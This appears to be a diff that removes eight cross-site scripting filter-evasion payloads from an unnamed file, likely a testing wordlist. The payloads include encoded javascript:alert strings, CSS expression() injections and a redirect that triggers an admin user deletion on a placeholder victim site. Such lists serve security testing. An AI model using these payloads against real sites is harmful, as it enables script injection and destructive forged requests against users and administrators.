@@ -1,8 +1,0 @@
-Redirect 302 /a.jpg http://victimsite.com/admin.asp&amp;deleteuser
-exp/*&lt;XSS STYLE=&apos;no\xss:noxss(&quot;*//*&quot;);
-&lt;!--[if gte IE 4]&gt;
-&lt;? echo(&apos;&lt;SCR)&apos;;
-&lt;DIV STYLE=&quot;background-image:\0075\0072\006C\0028&apos;\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029&apos;\0029&quot;&gt;
-\&quot;;alert(&apos;XSS&apos;);//
-&lt;IMG&#x0D;SRC&#x0D;=&#x0D;&quot;&#x0D;j&#x0D;a&#x0D;
-&lt;/br style=a:expression(alert())&gt;
